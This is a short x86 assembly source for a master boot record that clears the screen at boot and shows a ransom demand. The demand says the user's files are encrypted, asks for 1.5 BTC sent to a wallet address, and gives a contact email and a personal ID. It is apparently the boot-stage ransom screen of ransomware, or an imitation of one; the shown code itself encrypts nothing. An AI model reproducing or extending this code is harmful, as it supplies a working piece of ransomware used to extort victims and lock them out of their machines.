[org 0x7c00]
bits 16

; The stack segment
%define STACKSEG		0x2000

; start is loaded at 0x7c00 and is jumped to with CS:IP 0:0x7c00
start:
	cli
	; set up %ds and %ss as offset from 0
	xor ax, ax
	mov ds, ax
	mov ss, ax
	mov sp, STACKSEG ; set temp stack
	mov bp, sp
	sti

	call cls

	mov bx, ransom_note_0
	call println_16
	mov bx, ransom_note_1
	call println_16
	mov bx, ransom_note_2
	call println_16

	jmp idle

ransom_note_0:
	;db  7, "Your PC is now Stoned!", 7, 13, 10, 10, "~ ******** *********!", 0
	db 10, " Ooops, your important files are encrypted!", 10, 0

ransom_note_1:
	db 10, " To decrypt send 1.5 BTC to mp9yaEzuym4LEH3drxeDS1pSQrKiJzJi1M", 10, 0

ransom_note_2:
	db 10, " Then email us at contact@evilcorp.com with you personal ID: nGQ9xF84C", 10, 0

%include "code/utils.S"
%include "code/io16.S"
;%include "code/random.S" ; wallet id, personal ID

; padding and MBR magic
times 510 - ($-$$) db 0xff
dw 0xaa55
